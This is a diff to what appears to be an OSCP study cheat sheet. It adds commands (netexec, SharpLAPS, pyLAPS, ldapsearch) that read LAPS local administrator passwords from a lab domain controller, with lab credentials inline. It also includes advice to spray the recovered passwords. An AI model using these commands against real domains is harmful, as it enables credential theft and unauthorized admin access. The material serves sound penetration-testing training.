@@ -832,7 +832,7 @@ Just Upload via SMB CLIENT and listen via Responder you will get the NTLM Hash !
 
 
 
-### LAPS:
+### LAPS or ReadLAPSPassword
 
 ![image](https://github.com/kullaisec/OSCP/assets/99985908/db596238-7457-4ce9-a9aa-34c49057aa47)
 
@@ -841,6 +841,20 @@ Just Upload via SMB CLIENT and listen via Responder you will get the NTLM Hash !
 ```bash
 # netexec ldap 192.168.225.122 -u username -p password --kdcHost HUTCHDC[see image] -M laps
 ```
+```
+Another tool: https://github.com/swisskyrepo/SharpLAPS
+
+PS C:\temp> .\SharpLAPS.exe /user:hutch.offsec\fmcsorley /pass:CrabSharkJellyfish192 /host:192.168.225.122
+
+you can also make use of pyLAPS.py tool 
+
+pyLAPS.py --action get -d "oscp.lab" -u <username> -p <password> --dc-ip <DC_IP>
+
+Another method command using ldapsearch :
+
+# ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.225.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+```
+By this you can only get the Passwords not usernames the password is basically the Local admins passwords make a try on it or spray the passwords !! 
 
 
 #### Search anywhere file in windows:
